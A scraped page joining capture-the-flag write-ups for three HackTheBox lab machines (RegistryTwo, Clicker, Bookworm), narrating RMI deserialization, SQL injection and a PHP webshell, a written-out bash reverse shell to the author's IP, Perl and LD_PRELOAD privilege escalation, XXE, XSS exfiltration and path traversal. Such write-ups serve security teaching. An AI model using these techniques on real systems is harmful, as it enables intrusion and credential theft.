And this:
I’ll clone remote-method-guesser to my system, and as in the install instructions, go into that directory. Before running mvn package, I’ll edit src/config.properties, setting yso = /opt/ysoserial/ysoserial-all.jar. Now mvn package creates target/rmg-5.0.0-jar-with-dependencies.jar, which I’ll move up a directory and name rmg.jar.
At this point, I need to give rmg.jar a payload and a command. Both of these are a bit tricky. I know the commons-collections-3.1.jar is on the server from the lib directory. That means the payloads CommonsCollections1, CommonsCollections3, CommonsCollections5, CommonsCollections6, and CommonsCollections7 could work.
It also seems likely that I’ll be dropping into a container (for such a complex web setup on an insane box), so I will have to try a few different Linux commands to see if it works (ping, curl, wget). With some trial and error, I find that CommonsCollections5 plus wget works.
I’ll start rmg:
There’s a relatively quick cleanup on the rmi.host variable, so I’ll keep that POST request in Repeater so I can quickly send it to reset it back to my host. After sending, I’ll refresh /hosting/panel:
Just after, there’s a hist on my Python webserver:
Java is very picky about characters that break up commands like | and & and ;. To be safe, I’ll just get a shell in two steps. First, I’ll create a simple shell.sh containing a simple bash reverse shell:
I’ll have the server fetch this:
RegistryTwo requests the script from my server:
wget should save it in the current directory. I’ll stop rmg and rerun with a command to run it:
This time there’s a shell at nc:
It’s not worth a full Beyond Root section, but curl didn’t work because it’s not in this container:
ping is busybox, which isn’t SetUID, so it fails:
The intended way to get execution on the box is very similar to the attack I showed above, but rather than exploiting RMI, messing with the JDBC connection string and perform a deserialization attack similar to what’s shown here. It is very similar, though slightly more complex to pull off. It does use the same building blocks, changing mysql.host rather than rmi.host, and without the need for the null byte.

Category: Shell as developer
The shell is in a container. There’s a .dockerenv file in the system root, which is always a good sign:
The container has a docker0 interface but also is sharing the IP of the main host:
That’s not something seen often before on HTB, this comes from docker using the host network driver:
If you use the host network mode for a container, that container’s network stack isn’t isolated from the Docker host (the container shares the host’s networking namespace), and the container doesn’t get its own IP-address allocated. For instance, if you run a container which binds to port 80 and you use host networking, the container’s application is available on port 80 on the host’s IP address.
app’s home directory is very bare:
The only visible process is the Tomcat server. There’s nothing interesting in the Tomcat directories.
The WAR file makes a connection to registry.webhosting.htb:9002 for JMI. That host is defined as this one in the /etc/hosts file:
Looking at the listening ports, it is listening on 9002:
It kind of looks like it’s only open on IPv6 (which I’ll come back to in Beyond Root for an unintended shortcut), but it is open on IPv4 as well:
It’s not immediately clear because of how Docker is networking, but the RMI service is on the host.
I already abused the RMI connection with a deserialization attack to get execution in the container. I was able to do that just by seeing that RMI was in use, without actually looking at how it is used. The FileService object (defined in com.htb.hosting.rmi.FileService.class) is an interface, which is like an abstract class in Java. It defines methods, what arguments they take, and the type of the return value, without actually giving any of the code the does that. This allows the code here to create a FileService object and call the methods without having the actual code.
There is some remote file store and this is how to interact with it. This class uses the AbstractFile object, which is just a class that holds metadata about a file such as the display name, if it’s a directory, the size, the permissions, etc. The list method returns an array of these objects.
The RMIClientWrapper object has a single method, get, that initializes and returns a FileService object:
This is the code where I had to use the null byte to have it both contact my IP and end in ““.htb”.
com.htb.hosting.services.DomainServlet is a primary user of the FileService object. This servlet is responsible for creating domains, and adding, editing, and deleting files on them. For example, when it creates a new domain, it does that via the FileService (which for some reason it seems to get a new one each time with RMIClientWrapper.get()), and then uploads the default index.html to that vhost:
Most of the function used seem to take a VHost name along with additional parameters as make sense for that task.
To imaging what is likely happening, when a VHost is created, it gets a directory that serves as the root for the webserver.
I’ll create my own client to read and list files on the RMI host.
Java can be finicky about how it gets compiled. I’ll download and follow the install instructions for the IntelliJ IDEA Community Edition. I’ll create a new project and give is a location and name:
It starts an empty project:
For this to work, I’m going to use some of the code from hosting-app.war. The directory structures matter in Java, so I’ll mirror what’s in the WAR. I’ll right click on src and select New -> Package, and name it com.htb.hosting.rmi. On it, I’ll add a New File, and name it AbstractFile.java. I’ll copy all the code from jd-gui for that file and paste it into here. The only change I need to make is the package at the top is no longer WEB-INF.classes.com.htb.hosting.rmi, but rather just com.htb.hosting.rmi.  I’ll do the same for FileService.class.
I’ll do the same thing with RMIClientWrapper.java, but this one needs a bit more editing. It is loading the com.htb.hosting.utils.config.Settings class to get things like the name of the server to connect to. I’ll remove that import and modify the code to just connect to registry.webhosting.htb:
I’ll add a Main Java class at the root of src:
With a bit of playing around, I’ll build a Java program that will read files and list directories. I’m going to show just my final project, but it took many iterations of adding something, running it, looking at the results, updating to get to here. Getting direct access to the RMI port, either using the IPv6 unintended I cover in Beyond Root or tunneling with Chisel, makes this go must faster, but I’ll show the intended path here for completeness.
My Main class ends up as:
It takes in a vhost id, cmd of “ls” or “cat”, and file path as arguments.
If I build this with a modern version of Java, when I try to run it on the container on RegistryTwo, it will fail:
There’s a table on this Stack Overflow answer that shows what version of Java maps to what major version. I need to go back to Java 8. I’ll run sudo apt install openjdk-8-jdk, and then in File -> Project Structure, on the Project tab, select that JDK (Java 8 shows as 1.8 for some reason):
To run this, I’ll have IDEA build a JAR file. First, I’ll need to add an artifact output under File -> Project Structure, then under the Artifacts menu click the “+” -> JAR -> From module with dependencies…:
I’ll select Main as my Main Class and click OK to get out.
Now under Build > Build Artifacts I’ll select EvilRMI:jar -> Rebuild and it generates EvilRMI.jar:
I’ll upload EVilRMI.jar to the container on RegistryTwo:
I’ll run it giving it one of the domains from the list on the website, and the ls command with . to list the current directory:
When I first build the client, this was in the /sites/[vhost] directory and showed index.html. As I played with the development, it was easier to add in the ../../ to the code so that it based out of /.
With this ability to list directories and read files, I’ll look at the filesystem. There’s a single home directory:
Whatever user this is running as can read in it:
.git-credentials is interestring:
Those creds work for the developer user over SSH:
And get user.txt:

Category: Shell as root
This appears to be the host system. The developer user’s home directory doesn’t have anything else of interest:
The various websites are in /sites:
I’ll dig a bit more into how the website is configured in Beyond Root, but it’s not important for escalating to root.
The only thing really interesting on this file system is in /opt:
pspy shows there are few different crons running on this host.
vhost-manage is an ELF binary:
vhost-manage runs a JAR file. It doesn’t run for very long, so PSpy often misses it, but it does catch it occasionally:
If I run PSpy with -f for file system events, it catches it all the time:
The includes directory is a string in vhost-manage, and if I had to guess, I’d suggest -m is giving it a module to load.
quarantine.jar is the only file in /usr/share/vhost-manage/includes:
I’ll bring a copy back to my VM, and (after verifying the hashes match) open it in jd-gui. It’s files are all in com.htb.hosting.rmi, and it seems to have to do with ClamAV:
The main function gets a Client and calls scan():
The Client constructor function connects to the same local RMI instance on 9002 and gets a configuration, using that to create a ClamScan instance:
scan is simple as well. It gets the directory from the config, gets the files from the directory, and then loops over them calling doScan:
doScan checks if it’s been passed a directory, and if so, loops over the contents passing them to itself. If not, then it runs clamScan.scanPath on it, and if it returns FAILED, passes the file to quarantine:
quarantine simply copies the file to a folder specified in the config.
The ClamScan class constructor loads the configuration:
The scanPath method connects to the host and post over a socket sending data about the file, and then gets a response and turns it into a ScanResult object.
The response string is used to create a ScanResult object that is returned.
/etc/systemd/system/registry.service defines the registry service:
It’s running registry.jar noted above. It’s running as the rmi-service user. It’s not clear if that user is a target or not.
The registry.jar file is the RMI server. It is based from a com.htb.hosting.rmi package:
Server has the main function, creating a RMI registry listening on 9002 and giving it two services, FileService and QuarantineSevice:
The FileService is something I’ve already explored. It’s got the same interface in FileService.class, but that class is implemented in FileServiceImpl.class.
The more interesting bit is the Quarantine bits. The QuarantineSevice and QuarantineServiceImpl classes offer only one method besides the constructor:
The default configuration is to quarantine to /root/quarantine, scan /sites, and talk to ClamAV on localhost:3310 with a one second timeout.
Every three minutes, the registry server reloads. That means it stops listening on 9002 and then restarts listening on 9002. That means if I can start my own rogue registry service in that window, I can take over the registry service.
Every minute, the quarantine process is going to load a configuration from the RMI registry. It then scans a folder, connects to a ClamAV server, and based on the response, may copy the scanned file to a quarantine folder. The scanned folder, IP and port of the ClamAV server, and quarantine folder are are specified in the configuration from the registry.
I’m going to have a rogue registry server return a configuration that scans /root, contacts me as the ClamAV server, and quarantines to a folder I can read, giving me a full copy of /root.
I’ll open registry.jar in Recaf, a very neat tool that can edit Jar files. The class I need to modify is QuarantineServiceImpl where it generates the QuarantineConfiguration object:
The arguments for the object are directory to quarantine to, directory to scan, clam host, clam port, and timeout. I’ll update that line to:
I’ll export the new JAR as registry-0xdf.jar.
The simplest way to root this box is just to use nc as the ClamAV server. I don’t think this was supposed to work, but it does.
I’ll upload registry-0xdf.jar to RegistryTwo. Running it will almost certainly cause a BindException:
That’s because the real registry is already bound on 9002. I’ll use this loop to constantly start my registry until it works:
It will try to run the registry and if it works, exit the loop. Otherwise, it prints the date on the screen so I can watch the time increase towards a minute divisible by three:

Once the service resets, my rogue registry grabs the port and the real one will fail, typically one second after the reset. Now the next minute when the scan starts, I’ll start getting connections to my nc, which I run with nc -lnvkp 3310. The -k allows that single listener to get multiple connections.
This moves really slowly. The nc connection hangs open until the client times out, and then it moves to the next file, and there are a lot of files. I don’t believe this was supposed to work, but it does - the files are quarantined:
Each directory has a file in it:
Including one with creds for Git just like developer:
Making a Python socket server that will respond appropriately is a bit trickier. I need to understand the message that should come back in the response. The response is handled in ClamScan in the scanFile function, and passed into the constructor of a ScanResult object. It gets handled here:
To get quarantined, I need the result to end with FOUND_SUFFIX so it doesn’t change the status, which is initialized to FAILED earlier. FOUND_SUFFIX is just “FOUND”. It also has to be long enough, as it has to do a substring starting after the length of “stream: “.
With that in mind, and with a bit of help from ChatGPT, I’ll quickly create this Python server:
This handles all of /root in ~20-25 seconds, where as the nc approach took over two minutes.
root is not allowed to SSH with password, but those creds work with su to get a root shell:
And the root flag:
There are a few neat unintended paths that I’m aware of for RegistryTwo:
It’s possible to skip the entire Docker Registry enumeration using the File Read from the Sessions Example page. Enumeration already suggested this was a Java Web application, but by setting the editing file to /proc/self/cmdline, it affirms that it is Tomcat:
The page source shows that the data is loaded as a base64 blob and then decoded onto the page:
I’ll use that blog plus base64 -d and tr '\0' ' ' to decode this into a readable command line:
Tomcat logs are stored in the Tomcat home directory + /logs as catalina.[YYYY]-[MM]-[DD].log. I’ll read the log for today looking for when the server started. There’s this line:
Updating the session variable one last time to the hosting.war path, the viewer is ugly:
But it is a PK = Zip (or War) file. I’ll grab the base64 blob from the source (it takes a while to load entirely) and decode it into the WAR.
I noticed above that 9002 was listening on IPv6, and that it was listening on all interfaces. In theory, I could connect directly to it from my host, but there’s an IPtables rule blocking that. The script that sets this is /root/iptables.sh:
However, the IPv6 rules are not put in place. I’ll set the IP for registry.webhosting.htb to the IPv6 of the host in my local hosts file:
Then on IPv6, I’m able to talk directly to a lot more ports:
When jkr and TheATeam got root blood on RegistryTwo, they actually noticed after having a foothold on the box before getting root, and used it to make development of the RMI client easier avoiding having to upload a JAR each time to get the program working. However, it is possible to shortcut the entire foothold using this if I can leak the IPv6 of the host.
There are nice methods for enumerating IPv6 addresses of other hosts on the same network that work in shared HTB labs. Ippsec has a great primer on this that I won’t recreate here. I will show how to do it via the Sessions Example file read.
I showed above how I could use the Sessions Example page to set the file that loads in the editor to whatever page I want. I’ll set it to /proc/net/if_inet6:
On refreshing the editor, I get the file:
I can grab the one for eth0 and work with it there.
The website allows uses to create “domains” which it then handles as virtual hosts. I’ve already looked at the /sites directory. Each “domain” has a folder, including www:
The nginx config is in /etc/nginx/sites-enabled/default:
This is a neat nginx config. $http_host is the value in the Host HTTP header. If the (!-d /sites/$http_host) checks if a folder exists for that host, and if not, it returns a redirect to www.webhosting.htb. Then it sets the HTTP root to /sites/$http_host. It’s quite simply, but still very clever.
For anything in the /hosting/ directory, it is forwarding it to 127.0.0.1:8080, which is actually another docker container that runs the hosting-app.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 23 Sep 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
36257/tcp open  unknown
36645/tcp open  unknown
39989/tcp open  unknown
42059/tcp open  unknown
54001/tcp open  unknownCategory: Recon
nmap finds nine open TCP ports, SSH (22), HTTP (80), and seven related to NFS:
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy. The webserver returns a redirect to clicker.htb. All the RPC ports seem to be related to NFS.
Given the use of the domain name clicker.htb, I’ll use ffuf to look for any subdomains that respond differently.
www is worth checking out. The other two seem like errors. I’ll add these to my /etc/hosts file:
Some quick manual tests show that the two domains seem to return the same pages. As root later I can confirm this in /etc/apache2/sites-enabled/clicker.htb.conf:
The ServerAlias directive sets www.clicker.htb to be the same as clicker.htb.
The website is for an old-school looking game called Clicker:
The Info link (/info.php) just has some quotes from players. The Login link (/login.php) has a login form, and the Register link (/register.php) has a registration form:
Once I register and log in, there’s a game to play that’s just clicking to get “clicks”, and then spending clicks to level up and get more clicks per click:
It seems like a simple version of the Universal Paperclips game. The game is very easy to cheat in the browser dev tools:
It can lead to some wonky results:
The site is clearly built on PHP. All the clicking and scoring is done locally in JavaScript. Clicking “Save and close” will send the current numbers to the server actually as a GET request:
That redirects to /index.php?msg=Game has been saved!.
Sending really large numbers crashes it:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
admin.php is interesting, but even logged in it just redirects to the main page, likely requiring an admin account.
showmount -e will enumerate the available NFS shares:
There’s one share named backups. I’ll mount it to my host:
The zip has the source code for the website:

Category: Shell as www-data
I’ll give the highlights of the web source, going over what is needed for exploitation to gain a foothold. There’s also a file, diagnostic.php, that doesn’t matter now but will play a role in the escalation to root.
I’ll open the directory of files in VSCode and let the Snyk plugin scan the code. It finds potentially XSS in a bunch of pages, hardcoded creds for the database, and the use of MD5:
The XSS alerts are all the way the site passes error messages through GET parameters. None of this seems promising to be useful for me.
The admin panel starts with a check that the user’s ROLE is “Admin”:
After that, there’s a mostly static page that calls get_top_players and makes a table:
get_top_players is defined in db_utils.php.
There is an HTML form that sends a POST request to export.php with the threshold and a selection of  format as txt, json, and html:
export.php also does an admin role check at the start:
It builds output into a string as text, json, or HTML. HTML is the default rather than explicitly checking that the selection is html:
Then it writes the output to a file and returns the location:
save_game.php is one of the first times (besides registration and login) that the site interacts with the database. It checks that the user is logged in, and then checks that there is no GET parameter named role (in any casing):
The comment shows that even the author is aware that this is a potential mass assignment vulnerability. The $_GET is passed into save_profile, which is also in db_utils.php.
save_profile uses the passed in GET parameters to build an SQL string, and updates the player:
The player is passed as a prepared statement, and the developer uses $pdo->quote() to prevent SQL injection in the key values.
While the GET request to save_game.php only sends two parameters, clicks and level, any that are passed to save_profile will be saved. Looking at the create_new_player function, there’s at least the following columns in the players table:
This means I can easily change my username, nickname, or password via this mass assignment, by just adding &username=new0xdf to the end of the URL. Messing with username risks breaking things, as I could end up with a non-unique username, which is used as a key at times in the site. Similarly, if I set the password to a non-hashed value, it would make that account impossible to log in to.
I’m not able to change my role in this same manner, as that will be caught at the top of save_game.php and return a message “Malicious activity detected!”.
There are a couple of ways to bypass this filter. I’ll show two (yellow being the intended path):
The easiest way to bypass this check is with a newline injection in the parameter name. SQL is very forgiving of whitespace (it’s often best practice to break long queries across lines). So if I make the parameter role%0a=Admin, then it won’t return true when checked strtolower($key) === 'role'. When it gets to save_profile, it will generate the following SQL:
While the whitespace looks a bit odd, it works perfectly fine:
The $_SESSION['role'] is only set on login, but after logging out and back in:
There are other variations on this as well, such as role/**/, which adds the start and close of an SQL comment.
The other way to bypass the role check is using SQL injection. I noted that both the player name and values were protected against SQLI. However, the keys are not. The default parameters of clicks=4&level=0 result in the following SQL:
If I change the clicks parameter to role='Admin',clicks (and URL encode that so that it makes it to PHP as one parameter name), then first it checks if lower(role='Admin',clicks) is role and it’s not, and then the SQL becomes:
It bypasses the filter:
And results in admin access after logging out and back in.
As admin, I have access to the “Top Players” table, with an option to export in various formats, as observed in the source:
When I do the export, it reports the path:
And that link has it:
It’s interesting that the output adds the current player no matter if they meet the threshold or not.
The issue in the export.php code is that it takes the user input for the format and uses that as the file extension without validating that it’s one of the three allowed formats. Further, because the if/elseif/else structure doesn’t check the html case, it just uses HTML for anything that isn’t txt or json.
That means I can write a PHP file:
The table that’s output as HTML has only the nickname, clicks, and level fields:
I’ve noticed that nickname is set the same as username on registration, but there’s nothing to prevent my updating it via the mass assignment:
Now if I export again:
Putting that all together, I’ll change my nickname to be a PHP webshell:
I’ll do an export with extension=php:
Now I’ll visit http://clicker.htb/exports/top_players_zhfppp54.php?cmd=id and get execution:
To get a shell, I’ll start nc listening on 443 and visit http://clicker.htb/exports/top_players_7pbbwdqy.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27:
I’ll do the standard shell upgrade:

Category: Shell as jack
There’s one other user with a home directory on the box:
Unsurprisingly, www-data has no access.
I could look at the web stuff in www-data’s home directory, but it doesn’t prove useful here.
In /opt there’s a directory and a shell script:
monitor.sh starts with a check that it is running as root, so I’ll come back to that.
In manage, there’s a README.txt and an elf:
The README.txt has instructions for the binary:
The binary does require arguments:
Passing 1 shows the SQL that’s run:
It seems to be calling mysql and inputting .sql SQL dump files. Running strings on the binary bolsters this theory:
I’ll base64 encode the binary, copy it back to my host, and decode it to get a copy:
That matches what’s on Clicker:
I’ll open the binary in Ghidra and take a look. The entire thing is in main, which is:
It gets a filename, appends it to the mysql command so that it’s pass as input, and runs it with -v which shows the file.
I’ll also note that while case 0 is a failure, the default case runs with argv[2] as the filename.
I’ll try to read a file using execute_query with type 223 (or any other input that matches the default case) and directory traversal to get the file I want. It’s not able to read user.txt:
But /etc/passwd works:
I can also get jack’s SSH private key:
Interestingly, if I try to use this key just as is, I get:
I’ll have to add two “-“ to the first and last line from the key (no idea why those got truncated), and then it works:
And I can get user.txt:

Category: Shell as root
jack has two sudo entries configured:
With a password, jack can run any command as any user. Without a password, jack can run monitor.sh (with SETENV set). SETENV preserves the environment when calling the script.
The monitor.sh script is relatively simple:
It starts by making sure it’s running as root. Then it sets the PATH and unset some Perl-related env variables. These are presumably for security issues, preventing a hijack of xml_pp which is Perl-based.
Then it uses curl to request the diagnostic.php page from the site, passing the token “secret_diagnostic_token”, and sends the result into xml_pp, and saves the result to a file in /root.
xml_pp (short for XML pretty printer) will print XML data in a nicer way.
diagnostic.php starts by checking the the correct token is passed as a GET parameter:
“secret_diagnostic_token” is the right password here:
Then it defines a function that converts an array to XML. Then it gets a bunch of stats about the server and returns it as XML:
Running the script without root fails as expected, and as root returns the XML as expected:
Giving a user access to environment variables is dangerous, and while the author tires to prevent some attacks by setting the PATH and unsetting two Perl-related variables, there are still multiple ways to get root on this box. I’ll show three (with the intended path in yellow):
There’s a flag in Perl, -d , that sets the debugger:
-d[:debugger]     run program under debugger
In this script, I can’t set flags in the command line, but I can set the PERL5OPT environment variable, which will also set options. So if I set PERL5OPT=-d, then the debugger will be invoked.
There’s another variable, PERL5DB that sets a BEGIN block for the code to run when the debugger starts.
There is a somewhat famous example of a bug in the Exim mail server from 2016 where it allowed the user to set environment variables in this way, CVE-2016-1531:
Exim before 4.86.2, when installed setuid root, allows local users to gain privileges via the perl_startup argument.
POCs for this vulnerability show these variables used in exploitation:
To run this, I’ll just set these environment variables to touch a file:
The 0xdf file now exists owned by root in the system root:
To get a shell, I’ll create a copy of bash and make it SetUID and SetGID:
The file now exists, is owned by root, and is SetUID and SetGID:
I’ll run it (not forgetting -p to not drop privs) and get an effective root shell:
And the flag:
The intended path for this box is to use the http_proxy variable. This is an option for curl that is detailed on the curl man` page:
I’ll modify my Burp Proxy options to listen on all interfaces, rather than just localhost:
Now on running sudo http_proxy=http://10.10.14.6:8080 /opt/monitor.sh, the request and response show up in my Burp Proxy history:
This allows me to modify the request and the response.
I’ll enabling response interception in Burp, and when I run the command with http_proxy set to my Burp instance, it’ll hang on that intercepted request, which  I’ll let go through. Then it hangs on the response:
I’ll grab a basic XXE payload (for example from here) and update the response:
On clicking “Forward”, the file shows up in the terminal:
There are a handful of files I could try to read. root.txt would be a start, but I’d rather go for a shell. There happens to be a root SSH key when I set the XML to:
The result is:
With that, I’m able to save it to a file on my host, and SSH in:
Ippsec actually pointed this one out to me (though I’m embarrassed I missed it in hindsight). If I can set almost any environment variable, why not LD_PRELOAD? LD_PRELOAD is an environment variable that tells all running programs of a library to load on executing. This HackTricks page has exploit code.
I’ll create a simple C program that unsets the LD_PRELOAD variable (to prevent loops), sets the privileges to root user and group, and runs bash:
There’s no compilation tools on the host, but since both it and my VM are Ubuntu-based, compiling locally shouldn’t cause issues. I’ll generate a .so file:
I’ll copy this file up to Clicker into /tmp. Now I can run with LD_PRELOAD pointing at this shared object and it will run bash:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 27 May 2023
OS : Linux
Base Points : Insane [50]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal. On 80, it’s redirecting to bookworm.htb. I’ll fuzz for subdomains with ffuf, but it doesn’t find anything. I’ll add bookworm.htb to my /etc/hosts file, and re-run nmap to check for anything new, but there’s nothing interesting.
The site is a book store:
/shop offers books and prices:
Clicking on a book gives a page with details at /shop/[id]:
Trying to add a book to my “basket” (or cart) redirects to /login with a message saying I must be logged in:
I’m able to register and create an account. Then I can add to my basket, and go to checkout:
There’s an important note here. They are no longer offering free e-book downloads, but users who purchased when they were can download them still.
I’ll complete the order:
The profile page has the ability to upload my information, upload an avatar, and see my order history:
The HTTP headers show that this is a JavaScript Express web server:
The 404 page is the default Express 404 page as well:
There is a cookie and a cookie signature:
The cookie is just base64, which decodes to:
If I could compromise the secret that’s used with the signature, I could potentially forge cookies, but that won’t come into play here.
I’ll also note that the Cookies are marked when set as HttpOnly, which means I won’t be able to exfil them via XSS:
I’ll run feroxbuster against the site:
One take-away is that the server doesn’t seem to be case-sensitive, which is not common on Linux webservers. The /static/img/uploads directory seems interesting. It seems to be where profile pictures are stored, like these:
When I change my avatar, it is stored at /static/img/uploads/14. Nothing else too interesting.

Category: Shell as frank
The note that comes with my order is the one place on the website where I can put in text and it is displayed back, so I’ll want to check that for cross-site scripting (XSS). I’ll try a simple <script>alert(1)</script> payload. When I view the order, the note looks empty:
Interestingly, in the page source, the full tag is there:
So why was there no pop up? The console shows the answer:
There is a content security policy (CSP) specified in the response headers for the page:
The self directive specifies that the same origin is a valid source for scripts, and since there’s nothing else listed, nothing else will run. If I want to run a script, I need it to come from Bookworm.
The one place I found that I can upload files is the avatar. I’ll see what happens when I try to upload a JavaScript file. I’ll upload an image and get the request in Burp, sending it to Repeater. It’s a POST request to /profile/avatar.
If I change the Content-Type to anything that’s not image/png or image/jpeg, the response has the same redirect, but the cookie is set:
That cookie has a “flash message”:
However, if I don’t change the Content-Type, I can put whatever I want in the payload:
No cookie update means success. On my profile there’s a broken image:
If I create a message on an order to include the path to that image as the script source, like <script src="/static/img/uploads/14"></script>, then when I view that order:
At this point, I have XSS in my orders page, but doesn’t seem like anyone is checking it. I’ll include some JavaScript that will connect back to my host, using a simple fetch payload:
I’m showing the JavaScript Fetch API here where in the past I’ve often shown XMLHttpRequest. Either could work, but fetch is pretty clean.
When I refresh the same order, it loads the new JavaScript and makes an attempt at my server:
Unfortunately, there are no connections back to me from any other users.  It makes sense that no one else is looking at my orders. I’ll need to find a way to get XSS in front of another user.
I’ll need to find a page that other users are checking if XSS is going to get anywhere. I’ll notice when I update my basket note that the POST looks like:
The 386 in the url must be the ID of the basket being updated. When I visit the /shop page, I’ll notice that my activity is displayed:
Interestingly, that block of HTML has a comment above it:
If I visit when there’s another user there, their basket ID is in a comment as well:
Given that the basket ID is specified in the POST request to edit the comment, I’ll try writing to the basket of another user and see if I can edit it. I’ll choose a user who just added something to their cart, as they are most likely to be checking it.
I’ll grab an ID from the HTML in recent activity, and add that to a POST request in Repeater:
On sending, it returns a redirect to /basket (just like when I do it legitimately), and the Cookie has a flash message showing success:
A few minutes later, there’s a request at my Python webserver:
This is a classic insecure direct object reference (IDOR) vulnerability, as I’m able to access something I shouldn’t be able to just be changing the ID.
I’m going to need to update my XSS payload and then poison baskets again to figure out where to go next. I’ll write a quick Python script to make the necessary requests:
This assumes that the user 0xdf already exists with the password 0xdf0xdf, with an avatar ID of 14 (all configured at the top). It updates the avatar with the JavaScript defined towards the top, and then gets all the basket ids from /shop and poisons them.
I’m going to have to build a bunch of XSS payloads to get through the next step. To test, there’s a few techniques I found very helpful.
First, I’ll have an order on my profile page poisoned to load JavaScript from my avatar. This allows me to upload new JS, and then refresh my profile and look for errors in the developer tools console.
It’s also very useful to test JavaScript directly in the dev console before trying to put it into XSS payloads. It shows errors and line numbers, catching simple syntax errors.
I noted above that the cookies on the site are marked HttpOnly, so exfiling those won’t work. I don’t know of any other sites that might exist, but I could try to enumerate other ports on localhost. Before doing that, I’ll take a look at what these users can see on bookworm.htb. I’ll set the xss variable in my script to the following to take a look at the user’s profile:
I’ll listen with nc on port 80, and after a couple minutes, what returns is the same as what I see on mine, with different data / orders. The order numbers for the user are very low:
There’s a note on the /basket page about being able to download earlier orders as e-books:
To see what that looks like, I’ll check out these orders, updating my script first to:
I’ll run nc -klnvp 80 so that it stays open and handles multiple requests on 80. When this executes, I get the IDs from the target profile:
I’ll update this to return the order pages:
This should get each order page in the profile, fetch it, and return it to me via POST request.
After a few minutes (and a few attempts running the script), I get a connection, which gives a few pages. For example, one might look like the following page:
The CSS doesn’t load, but that’s ok. The interesting part is the “Download e-book” link, which points to /download/7?bookIds=9. Some orders have more than one book, and look like this:
The important difference here is the “Download everything link”, which leads to /download/2?bookIds=18&bookIds=11. It seems that the bookIds parameter can be a single string or (when multiple are specified) an array (I go over why this works in Beyond Root.
I’ll try to download a file by updating my script to find the link again to get a single download link and return what it returns. I’ve updated the response to be resp3.blob() rather than .text() because I expect an e-book to be a binary format:
This one returns a PDF:
I’m curious to see what comes back when I try to download multiple books at the same time. It seems unlikely that it would be a single PDF, and more likely some kind of archive.
I wasted a ton of time trying to write JavaScript that would check each order page for a “Download everything” link and visit it. I’m sure it’s possible, but the JS was getting complex and very difficult to troubleshoot blindly and over 4-5 minute waits.
Eventually I decided to try seeing how tied to the current user to download is. The order ID in the URL must match the current user, or nothing comes back. But it doesn’t seem that that books are checked to see if they are in the current order. That means I can just grab an order ID from the profile and then download any books I want:
What comes back is a ZIP archive:
It looks a bit weird here because some of the binary bytes end up messing up some of the ASCII ones, but collecting it again and saving it to a file shows that it is as I’ll show in the next section.
If I’m going to be trying to collect files, it seems time to make a better webserver than just catching them with nc.
This is a simple Python Flask server that will save any file sent to /exfil to a file in the exfil directory as a Zip.
Now I can run the same get for two PDFs above and get a ZIP:
Thinking about how the server is working, likely these e-books are stored on the file system. It’s worth looking at the download requests to see if I can read other files off the file system.
Trying the single download doesn’t seem to work. I just get nothing back. I’ll look at this in Beyond Root. I’ll try this payload to do a directory traversal in the multi-file download:
When it returns, there’s a Unknown.pdf in the zip:
It’s not a PDF, but /etc/passwd:
In addition to a proof that the directory traversal works, I’ll also note the usernames frank, neil, and james.
I’ll try to pull the source code for this application. I know it’s Express, so the main function is likely in an index.js. It’s not in the current directory, but it returns the source with the XSS payload updated with:
The main source is:
There’s a lot here to look at, but what ends up as interesting is the local import of database.js:
I’ll pull that:
There’s creds at the top.
I’ve got three usernames from the passwd file, and now another username and password from the database. netexec (formerly crackmapexec) is a quick way to check if any work over SSH. I like to include --continue-on-success to see if multiple users might use that password:
It works for frank!
I’m able to get a shell as frank:
And user.txt:

Category: Shell as neil
frank’s home directory is very empty:
There are two other home directories. frank can’t access james, but can access neil’s:
There’s an interesting directory, converter, which seems to hold another JavaScript web application:
There are services listening on 3000 and 3001:
The service on 127.0.0.1:3000 is just the server behind port 80:
The source shows that converter runs on 3001:
Looking for potential services that might launch this, it’s interesting that there are three that I can’t read:
Seems likely that bookworm.service is the main website and bot.service is the bot that interacts with the XSS. That would leave devserver.service to potentially be converter?
It seems like this is likely running as neil:
Everything in the /proc directory for this process is owned by neil.
First I want to take a look at the site. I’ll use my SSH session to get a tunnel (-L 3001:localhost:3001) so I can load it in my browser. It’s a page to convert files:
The source shows two routes:
/ just shows the form. /convert takes input and calls ./calibre/ebook-convert.
Running this with -h shows the help:
It takes file formats based on the input and output extensions. If there’s no output extension, it assumes it’s “open e-book (OEB)” format.
There’s a lot of “recipes”:
I’ll create a test file and play with different ways of converting.
It creates a directory with files when there’s no extension. If I write to another .txt, it basically copies it, adding a bunch of whitespace:
When I submit a file for convert via the website, the POST request looks like (with some unnecessary headers removed):
The output filename is generated here:
That also looks like a directory traversal vulnerability. I’ll try updating this in Burp Repeater:
It shows success, and the file exists:
If I can get write as neil, I would want to write an SSH key into their authorized_keys file. But that has no extension, which by default means that ebook-convert would create the directory, which is not useful.
If I want to write a text file but without a .txt, I’ll try a symlink:
It worked! I wrote text to /tmp/output.
Moving to the web, I’ll create a new symlink to test:
When I send the same payload targeting /tmp/outweb.txt, it fails:
The issue here is protected symlinks, which is a kernel option that:
When set to “1” symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.
Because the link is in a world-writable directory and the uid of the symlink (frank) and the follower (neil) don’t match, it doesn’t follow and crashes. frank doesn’t have permissions to check if this is enabled:
To test this theory, I’ll write a symlink in frank’s home directory instead:
It still points at /tmp/outweb. When I send the request to the site, it returns 200:
And the data is in /tmp/outweb owned by neil:
That looks like arbitrary write as neil.
From frank’s home directory, I’ll write a new link pointing to neil’s authorized_keys file:
I’ll send my public SSH key targeting the link:
Now when I try to SSH as neil, it works:

Category: Shell as root
neil is able to run the genlabel script as root:
Only root can run it, and it takes an order it:
When run, it generates a .pdf and a postscript (.ps) file:
I’ll scp that to my host, and open it to see a label:
